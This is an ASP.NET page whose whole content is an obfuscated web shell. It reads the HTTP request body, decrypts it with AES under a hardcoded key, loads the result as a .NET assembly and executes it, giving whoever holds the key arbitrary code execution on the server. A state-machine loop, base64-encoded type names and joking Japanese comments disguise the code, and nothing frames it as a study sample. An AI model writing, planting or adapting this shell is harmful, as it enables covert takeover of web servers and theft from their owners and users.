<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if (Request.Cookies.Count == 0) return;

    int a = 0;
    byte[] b = null;
    byte[] c = null;
    object d = null;

    while (a != 5) { // ループは続くよどこまでも
        switch (a) {
            case 0:
                // 月が綺麗ですね
                char[] e = { 'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0' };
                c = System.Text.Encoding.UTF8.GetBytes(new string(e));
                a = 2;
                break;
            
            case 1:
                // 腹が減っては戦はできぬ
                var f = System.Reflection.Assembly.Load(b);
                var g = "Sw=="; // "K"
                var h = System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String(g));
                d = f.CreateInstance(h);
                a = 4;
                break;

            case 2:
                // とりあえずビール
                var i = Request.InputStream;
                var j = new byte[i.Length];
                i.Read(j, 0, j.Length);
                
                // 仕様です
                var k = "U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SaWpuZGFlbE1hbmFnZWQ=";
                var l = System.Text.Encoding.ASCII.GetString(System.Convert.FromBase64String(k));
                var m = System.Type.GetType(l);
                var n = (System.Security.Cryptography.SymmetricAlgorithm)System.Activator.CreateInstance(m);
                
                var o = n.CreateDecryptor(c, c);
                b = o.TransformFinalBlock(j, 0, j.Length);
                a = 1;
                break;
            
            case 3:
                // このコードは天才が書いたに違いない
                a = 5;
                break;

            case 4:
                // 全ては計画通り
                d.Equals(this);
                a = 5;
                break;
        }
    }
}
</script>